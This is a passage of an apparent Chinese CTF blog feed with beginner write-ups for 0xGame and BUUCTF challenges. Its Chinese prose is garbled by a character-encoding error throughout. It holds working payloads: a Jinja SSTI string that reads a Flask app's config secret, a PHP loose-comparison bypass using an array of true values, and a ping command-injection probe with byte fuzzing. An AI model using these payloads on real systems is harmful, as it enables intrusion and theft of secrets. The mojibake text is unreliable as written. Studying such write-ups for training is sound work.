ä¸‹è½½é™„ä»¶åç”¨wiresharkæ‰“å¼€ï¼Œå‘ç°å¥½åƒæ˜¯ä¸ªç™»å½•è¿‡ç¨‹ï¼Ÿç™»å½•åæ‰§è¡Œäº†ä¸€äº›å‘½ä»¤ ï¼š</p><p><img src="/img/shark.png" alt="shark"></p><p>ç›´æ¥æœ<code>0xGame</code>å’Œ<code>flag</code>éƒ½æ²¡ç»“æœã€‚ã€‚ä½†åœ¨è¿”å›åŒ…é‡Œæœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Ÿ</p><p><img src="/img/shark2.png" alt="shark2"></p><p>æŠŠdataæ‹¿å‡ºæ¥æ‹¿å»é—®äº†CHATGPT:)è¯´è¿™æ˜¯ä¸€ä¸ªZIPæ–‡ä»¶çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œè¦æŠŠå®ƒè§£ç æˆäºŒè¿›åˆ¶æ•°æ®å†è§£å‹ã€‚å‘ç°æœ‰ä¸ª<code>flag.txt</code>æ–‡ä»¶ï¼Œä½†éœ€è¦å¯†ç ï¼š</p><p><img src="/img/shark3.png" alt="shark3"></p><p>æƒ³åˆ°åˆšæ‰è¿½è¸ªæµçš„æ—¶å€™æœ‰ä¸ªvery_safe_passwordï¼Œå°è¯•äº†ä¸€ä¸‹å¾—åˆ°äº†flagï¼š<code>0xGame&#123;7a504dab-ada6-4c41-adb3-0d1530098cd4&#125;</code></p><h3 id="Week-1-hide-and-seek"><a href="#Week-1-hide-and-seek" class="headerlink" title="[Week 1] hide and seek"></a>[Week 1] hide and seek</h3><p>æ ¹æ®é¢˜ç›®æç¤ºå’Œå¸ˆå‚…åœ¨ç¾¤é‡Œçš„æç¤ºï¼Œä¸‹è½½äº†<code>stegseek</code>è¿™ä¸ªå·¥å…·ï¼Œå¼„ä¸€ä¸‹å°±å¾—åˆ°flagäº†ï¼š</p><p><img src="/img/hiideandseek.png" alt="hiideandseek"></p><h3 id="Week-1-least-and-most"><a href="#Week-1-least-and-most" class="headerlink" title="[Week 1] least and most"></a>[Week 1] least and most</h3><p>é¢˜ç›®æç¤ºæ˜¯éšå†™ï¼Œç½‘ä¸Šä¸‹äº†ä¸ªå«<code>stegsolve</code>çš„å·¥å…·ï¼Œä¸€é€šä¹±ç‚¹å¾—åˆ°äº†ï¼š</p><p><code>0xGame&#123;l sb_com</code>å’Œ<code>bined_wi th_msb&#125;</code>ã€‚</p><h3 id="Week-1-signin-1"><a href="#Week-1-signin-1" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p><code>R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=</code></p><p>çœ‹ç€åƒbase64ï¼Œå…ˆè§£ç çœ‹çœ‹å•¥æƒ…å†µï¼š</p><p><code>GB4EOYLNMV5VOZLMMMYG2ZK7KRXV6MDYI5QW2ZJSGAZDGIJBPU======</code></p><p>å†ç”¨base32è§£ä¸€ä¸‹ï¼š</p><p><code>0xGame&#123;Welc0me_To_0xGame2023!!&#125;</code></p><h3 id="Week-1-é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs"><a href="#Week-1-é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs" class="headerlink" title="[Week 1] é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs"></a>[Week 1] é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs</h3><p>ä¸‹è½½å‘ç°æ˜¯ä¸ªbspæ–‡ä»¶ï¼Œæ ¹æ®å¸ˆå‚…çš„æç¤ºå‘ç°è¿™ä¸œè¥¿æ˜¯ä¸ªcs1.6çš„åœ°å›¾æ–‡ä»¶ï¼Œé‡å‘½åä¸€ä¸‹æ”¾åˆ°<code>cstrike</code>ä¸‹çš„<code>maps</code>æ–‡ä»¶å¤¹é‡Œï¼Œç„¶åcs1.6ç›´æ¥è¿›åœ°å›¾ã€‚åœ¨é¼å³ä¸‹è§’æ‰¾åˆ°äº†ä¸€ä¸²å°å­—ï¼š</p><p><code>0xGame&#123;CS_very_good&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="Week-1-æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag"><a href="#Week-1-æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag" class="headerlink" title="[Week 1] æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag"></a>[Week 1] æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag</h3><p><code> nc 8.130.35.16 51000</code>å<code>ls</code>,å‘ç°æœ‰ä¸ª<code>flag</code>ä½†<code>cat</code>è¯»äº†å‘ç°æ˜¯å‡çš„:</p><p><img src="/img/secret.png" alt="secret"></p><p><code>ls -al</code>å‘ç°æœ‰ä¸ª<code>.secret</code>æ–‡ä»¶ï¼Œ<code>cat</code>è¯»äº†ä¸‹å¾—åˆ°äº†<code>flag</code></p><p><img src="/img/pwn1.png" alt="pwn1"></p><h1 id="Cryptoéƒ¨åˆ†"><a href="#Cryptoéƒ¨åˆ†" class="headerlink" title="Cryptoéƒ¨åˆ†"></a>Cryptoéƒ¨åˆ†</h1><h3 id="Week-1-Vigenere"><a href="#Week-1-Vigenere" class="headerlink" title="[Week 1] Vigenere"></a>[Week 1] Vigenere</h3><p>é¢˜ç›®æè¿°ï¼šå¯†æ–‡ï¼š0dGmqk{79ap4i0522g0a67m6i196he52357q60f} å¤è€è€Œç¥ç§˜çš„åŠ å¯†æ–¹å¼ï¼Ÿ</p><p><code>flag</code>æ ¼å¼<code>0xGame&#123;xxxx&#125;</code>ï¼Œç°åœ¨å¼€å¤´æ˜¯<code>0dGmqk</code>ï¼ŒçŒœæµ‹å¯†é’¥å‰å››ä½æ˜¯<code>game</code>?ï¼Œå…ˆåœ¨çº¿è§£å¯†çœ‹ä¸‹ç»“æœï¼š</p><p><img src="/img/vig.png" alt="vig"></p><p>å¾—åˆ°flagã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFåšé¢˜è®°å½•_1</title>
    <link href="/2023/09/17/helloworld/"/>
    <url>/2023/09/17/helloworld/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a><strong>shrine</strong></h2><p>è¿›å»ç›´æ¥ç»™äº†ä¸€å¤§å¨ä»£ç ï¼Œç®€å•æ‹ä¸€ä¸‹ï¼š<br><img src="/img/c1.png" alt="c1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#å°†FLAGä»ç¯å¢ƒå˜é‡ä¸­å¼¹å‡ºå»ï¼Œå¼¹å‡ºå»çš„FLAGç»™äº†app.configå­—å…¸ä¸­FLAGé”®å¯¹åº”çš„å€¼ï¼Œå¯ä»¥ç”¨config[&#x27;FLAG&#x27;]è®¿é—®å®ƒï¼Œä½†åé¢ä¼šæŠŠconfigè¿™ä¸œè¥¿å½“é»‘åå•è¿‡æ»¤æ‰ã€‚</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>       s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#å·¦æ‹¬å·æ›¿æ¢ä¸ºç©ºï¼Œå³æ‹¬å·æ›¿æ¢ä¸ºç©º</span><br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<span class="hljs-comment">#æŠŠé»‘åå•é‡Œçš„å­—ç¬¦å…¨æ›¿æ¢ä¸ºç©ºï¼Œä¸¤ä¸ª%ç”¨æ¥è½¬ä¹‰ï¼Œå¦åˆ™&#123;&#125;å°±è¢«å½“æˆå ä½ç¬¦äº†ã€‚æ³¨æ„è¿™ä¸ªåªæ›¿æ¢åŒæ‹¬å·é‡Œçš„configå’Œselfï¼Œå•ä¸ªæ‹¬å·æ²¡å•¥å½±å“ã€‚</span><br><br>  <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>çŒœæµ‹SSTIæ¨¡æ¿æ³¨å…¥ï¼Œåœ¨&#x2F;shrine&#x2F;ä¸‹å°è¯•49:<br><img src="/img/c2.png" alt="c2"><br>ä¸ƒä¸ªä¸ƒï¼Œè€Œä¸”ä»£ç é‡Œéƒ½æäº†Jinjaã€‚<br>å¯¹äºè¾“å…¥é¦–å…ˆè¿‡æ»¤äº†()ï¼Œç„¶åè¿‡æ»¤äº†configå’Œselfè¿™ä¸¤ä¸ªå…³é”®å­—ã€‚<br>åˆ©ç”¨<code>/shrine/&#123;&#123;"".__class__.__base__.__base__&#125;&#125;</code>æ‰¾åˆ°äº†å®ƒæœ€å¤§çš„çˆ¹<code>object</code>ï¼Œå†ç”¨subclassesæ‰¾å®ƒä¸‹é¢çš„æ‰€æœ‰å­ç±»ï¼š<br><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()&#125;&#125;</code><br><img src="/img/c3.png" alt="c3"><br>å‡ºäº†ä¸ªè¿™ç§ä¸œè¥¿å°±ä¸ä¼šåšäº†ã€‚æ„Ÿè§‰è‡ªå·±çš„çŸ¥è¯†è¿˜æ˜¯å¤ªè´«ç˜ äº†ï¼Œä¸€çœ‹åˆ°SSTIçš„é¢˜å°±æƒ³ç€åˆ¤æ–­ç±»å‹ç„¶åæ‰¾å®ƒçš„çˆ¹æ‰§è¡Œå‘½ä»¤ï¼Œéƒ½å¿«æˆæ€ç»´å®šå¼äº†ã€‚ã€‚ã€‚è€Œä¸”åšé¢˜ä¹Ÿä¸ç»†å¿ƒï¼Œæ—¢ç„¶å®ƒæŠŠconfigå’Œselfæ”¾åˆ°äº†é»‘åå•é‡Œï¼Œé‚£ä¸ºä»€ä¹ˆååæ”¾å®ƒä¿©å‘¢ï¼Ÿconfigå¯èƒ½æ˜¯å› ä¸ºæŠŠFLAGç›´æ¥å¼¹ç»™äº†å®ƒæ‰€ä»¥è¿‡æ»¤ï¼Œé‚£selfä¸ºä»€ä¹ˆè¿‡æ»¤ï¼Ÿå¸Œæœ›ä»¥ååœ¨å­¦ä¹ è¿‡ç¨‹ä¸­èƒ½å…‹æœè¿™äº›é—®é¢˜ã€‚<br>å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpçœ‹çœ‹å…¶å®ƒå¸ˆå‚…æ˜¯æ€ä¹ˆè§£çš„ï¼Œæ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Cl0ud/</span>p/<span class="hljs-number">12316287</span>.html<br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">93746437</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰é»‘åå•çš„åŒ–ï¼Œç›´æ¥å³å¯è®¿é—®ç¯å¢ƒå˜é‡ä¸­çš„FLAGï¼Œæˆ–è€…ç”¨self.<strong>dict</strong> è®¿é—®ä½†configå’Œselfè¢«é»‘åå•è¿‡æ»¤æ‰äº†ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨pythonå†…ç½®å‡½æ•°ï¼š<code>url_foræˆ–è€…get_flashed_messages</code>è¯»å–å…¨å±€å˜é‡<code>current_app</code>ã€‚å†åˆ©ç”¨è¿™ä¸ª<code>current_app</code>è®¿é—®configå­—å…¸ä¸­FLAGé”®å¯¹åº”çš„å€¼ã€‚</p><p>payload:<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a><strong>lottery</strong></h3><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªç±»ä¼¼çŒœéª°å­çš„ä¸œè¥¿ï¼šæ³¨å†Œè´¦å·åå»èŠ±é’±çŒœæ•°ï¼ŒçŒœå¯¹äº†ç»™é’±ã€‚å½“å£è¢‹é¥±é¥±ä¹‹åå¯ä»¥ä¹°FLAGï¼š</p><p><img src="/img/lo1.png" alt="lo1"></p><p>é¢˜ç›®ç»™äº†ä¸ªé™„ä»¶ï¼Œçœ‹çœ‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p><img src="/img/lo2.png" alt="lo2"></p><p>ç›´æ¥æŠŠæ‰€æœ‰ä»£ç éƒ½ç»™äº†ï¼Ÿå’Œé’±æœ‰å…³çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$money</span> = <span class="hljs-string">&#x27;$&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>]; <span class="hljs-comment">//moneyåœ¨SESSIONå˜é‡ä¸­ï¼Ÿç›´æ¥burpsuiteæŠ“åŒ…çœ‹çœ‹èƒ½ä¸èƒ½æ”¹</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;li&gt;Username: <span class="hljs-subst">$name</span>&lt;/li&gt;</span><br><span class="hljs-string">&lt;li&gt;Money: <span class="hljs-subst">$money</span>&lt;/li&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//acount.php</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥å»buyç•Œé¢çŒœæ•°æŠ“åŒ…çœ‹çœ‹å•¥æƒ…å†µï¼š</p><p><img src="/img/lo3.png" alt="lo3"></p><p>POSTä¼ äº†<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;7777777&quot;&#125;</code>ï¼Œ<code>action:buy</code>ï¼Œ<code>numbers</code>åé¢æ˜¯æˆ‘ä»¬çŒœçš„æ•°å­—ï¼Œç³»ç»Ÿä¼šæŠŠæ•°å­—å¸¦è¿›å»å’Œ<code>&quot;win_numbers&quot;:&quot;8701664&quot;</code>æ¯”è¾ƒï¼Œè¿™ä¸ª<code>win_numbers</code>å’Œæ¯”è¾ƒå¯¹é”™æ˜¯æ€ä¹ˆå®šä¹‰çš„ï¼Ÿæ‰¾æ‰¾æœ‰æ²¡æœ‰ç›¸å…³çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">require_registered</span>();<br><span class="hljs-title function_ invoke__">require_min_money</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];<br><span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];<br><span class="hljs-variable">$win_numbers</span> = <span class="hljs-title function_ invoke__">random_win_nums</span>(); <span class="hljs-comment">//åé¢é‚£ä¸ªæ˜¯ç”Ÿæˆçš„ä¸ƒä½éšæœºæ•°</span><br><span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//æŒºå¸¸è§çš„å¼±ç›¸ç­‰ï¼Œè‹¥å¯¹Numbersæ— è¿‡æ»¤åˆ™ç›´æ¥è¾“å…¥å¸ƒå°”Trueè®©å®ƒå’Œä»»ä½•éé›¶æ•°å­—ç›¸ç­‰</span><br><span class="hljs-variable">$same_count</span>++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;   <span class="hljs-comment">//ä¸¤ä¸ªåŠä»¥ä¸Šç›¸åŒæ‰ä¼šç»™é’±</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">300</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">1800</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">200000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5000000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;  <span class="hljs-comment">//æ¯æ¬¡å°è¯•éœ€è¦ä¸¤å—é’±</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;<br><span class="hljs-title function_ invoke__">response</span>([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>PHPçš„å¼±ç›¸ç­‰(&#x3D;&#x3D;)å’Œå¼ºç›¸ç­‰(&#x3D;&#x3D;&#x3D;)ç¢°è§æŒºå¤šæ¬¡äº†ï¼Œå¼±ç›¸ç­‰ä¼šåœ¨æ¯”è¾ƒä¹‹å‰è¿›è¡Œç±»å‹è½¬æ¢ï¼Œè½¬æ¢å®Œäº†å†æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰(å¯ä»¥ç”¨å¸ƒå°”ã€ç§‘å­¦è®¡æ•°æ³•ç­‰ç»•è¿‡)ã€‚å¼ºç›¸ç­‰ä¼šç›´æ¥æ¯”è¾ƒç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Ÿå†…å®¹æ˜¯å¦ç›¸ç­‰?(ä¸è¿‡ä¾ç„¶å¯ä»¥é€šè¿‡æ•°ç»„æ–¹æ³•ç»•è¿‡)ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ä¸‹é¢çš„æ€»ç»“å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« :https://blog.csdn.net/qq_43715020?<span class="hljs-keyword">type</span>=blog <br><br>åœ¨phpä¸­,å¦‚æœ<span class="hljs-type">bool</span>å’Œ&quot;ä»»ä½•å…¶ä»–ç±»å‹&quot;æ¯”è¾ƒ,&quot;ä»»ä½•å…¶ä»–ç±»å‹&quot;ä¼šè½¬æ¢ä¸º<span class="hljs-type">bool</span>ã€‚<br>åœ¨PHPä¸­å½“è½¬æ¢ä¸º <span class="hljs-type">boolean</span> æ—¶ï¼Œä»¥ä¸‹å€¼è¢«è®¤ä¸ºæ˜¯ <span class="hljs-keyword">FALSE</span> ï¼š<br>(<span class="hljs-number">1</span>) å¸ƒå°”å€¼ <span class="hljs-keyword">FALSE</span> æœ¬èº«<br>(<span class="hljs-number">2</span>) æ•´å‹å€¼ <span class="hljs-number">0</span>ï¼ˆé›¶ï¼‰<br>(<span class="hljs-number">3</span>)æµ®ç‚¹å‹å€¼ <span class="hljs-number">0.0</span>ï¼ˆé›¶ï¼‰<br>(<span class="hljs-number">4</span>)ç©ºå­—ç¬¦ä¸²ï¼Œä»¥åŠå­—ç¬¦ä¸² â€œ<span class="hljs-number">0</span>â€<br>(<span class="hljs-number">5</span>)ä¸åŒ…æ‹¬ä»»ä½•å…ƒç´ çš„æ•°ç»„(æ³¨æ„,ä¸€æ—¦åŒ…å«å…ƒç´ ,å°±ç®—åŒ…å«çš„å…ƒç´ åªæ˜¯ä¸€ä¸ªç©ºæ•°ç»„,ä¹Ÿæ˜¯<span class="hljs-keyword">true</span>)<br>(<span class="hljs-number">6</span>)ä¸åŒ…æ‹¬ä»»ä½•æˆå‘˜å˜é‡çš„å¯¹è±¡ï¼ˆä»… PHP <span class="hljs-number">4.0</span> é€‚ç”¨ï¼‰<br>(<span class="hljs-number">7</span>)ç‰¹æ®Šç±»å‹ <span class="hljs-keyword">NULL</span>ï¼ˆåŒ…æ‹¬å°šæœªèµ‹å€¼çš„å˜é‡ï¼‰<br>(<span class="hljs-number">8</span>)ä»ç©ºæ ‡è®°ç”Ÿæˆçš„ SimpleXML å¯¹è±¡<br>(<span class="hljs-number">9</span>)æ‰€æœ‰å…¶å®ƒå€¼åŒ…æ‹¬<span class="hljs-number">-1</span>éƒ½è¢«è®¤ä¸ºæ˜¯ <span class="hljs-keyword">TRUE</span> <br></code></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯æ‹¿æ•°ç»„å…ƒç´ ä¸€ä¸ªä¸€ä¸ªçš„æ¯”è¾ƒï¼Œé‚£å°±ç›´æ¥è®©<code>&quot;numbers&quot;</code>ä¸º[true,true,true,true,true,true,true]ã€‚</p><p>payload:<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</code></p><p><img src="/img/lo4.png" alt="lo4"></p><p>ä¸è¿‡æœ‰ä¸ªé—®é¢˜æˆ‘è¿˜æ²¡ææ‡‚ï¼šboolçš„trueå’Œfalseå¸¸é‡æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œä½†æˆ‘æ”¹æˆï¼š<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[TRUE,TRUE,TRUE,TRUE,TRUE,TRUE,TRUE]&#125;</code>å°±ç»™æˆ‘å›æ˜¾invalid jsonã€‚ã€‚ã€‚éš¾é“jsonè¿™ä¸œè¥¿çš„ä¸€äº›å®šä¹‰è¿˜å¯¹å¤§å°å†™æœ‰è¯´æ³•ï¼Ÿ</p><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>é¢˜ç›®æè¿°: æŠ“ä½é‚£åªçŒ«</p><p><img src="/img/cat1.png" alt="cat1"></p><p>éšä¾¿è¾“äº†ä¸ªloli.clubæ²¡å•¥ååº”ï¼Œå•ä¸Šé¢çš„URLå˜åŒ–äº†ï¼š</p><p><code>/index.php?url=loli.club</code></p><p>GETä¼ å‚url?çœ‹ç€åƒå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</p><p>url&#x3D;etc&#x2F;passwdè¯•äº†åŠå¤©æ²¡å•¥ååº”ã€‚ã€‚ç”¨burpsuiteæŠ“åŒ…çœ‹responseæœ‰ä¸ªCATï¼Ÿè¾“ä¸ªCATå°è¯•ä¸€ä¸‹ï¼š</p><p><img src="/img/cat2.png" alt="cat2"></p><p>æ‰§è¡Œäº†pingå‘½ä»¤ï¼Ÿè¯•è¯•127.0.0.1ï¼š</p><p><img src="/img/cat3.png" alt="cat3"></p><p>æœç„¶æ˜¯pingå‘½ä»¤ï¼Œé‚£è¿™é¢˜å¯èƒ½æ˜¯RCEï¼Œä½†&amp;|;å‡è¢«è¿‡æ»¤æ‰äº†(æç¤ºinvalid URL)ã€‚ã€‚åé¢ä¸ä¼šåšäº†ï¼Œä¸‹é¢éƒ¨åˆ†å†…å®¹å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„åšå®¢ï¼Œæ„Ÿè°¢ï¼š<code>https://blog.csdn.net/qq_44065556/article/details/120541298å’Œhttps://www.cnblogs.com/xyongsec/p/11364520.html</code></p><p>æ—¢ç„¶æœ‰è¿‡æ»¤å°±è¦çœ‹çœ‹å®ƒè¿‡æ»¤äº†å•¥æ²¡è¿‡æ»¤äº†å•¥ï¼Œåœ¨æ¡†é‡Œè¾“å…¥ä¸œè¥¿åä¸Šé¢çš„URLä¼šå˜åŒ–ï¼š</p><p><code>http://61.147.171.105:53337/index.php?url=127.0.0.1%26ls</code></p><p>ç›´æ¥é€åˆ°burpsuiteé‡Œçˆ†ç ´ï¼Œé›†æŸç‚¸å¼¹æ¨¡å¼ä»<code>%00</code>çˆ†åˆ°<code>%FF</code>ï¼Œå‘ç°å½“URLå¤§äº%80åä¼šæœ‰æŠ¥é”™ï¼š</p><p><img src="/img/cat4.png" alt="cat4"></p><p><img src="/img/cat5.png" alt="cat5"></p><p>å‘ç°æœ‰<html>ï¼Œ<head>ç­‰æ ‡ç­¾çŒœæµ‹è¦æ”¹æˆhtmlåç¼€ï¼Ÿæ”¹å®Œåæ‰“å¼€ï¼š</p><p><img src="/img/cat6.png" 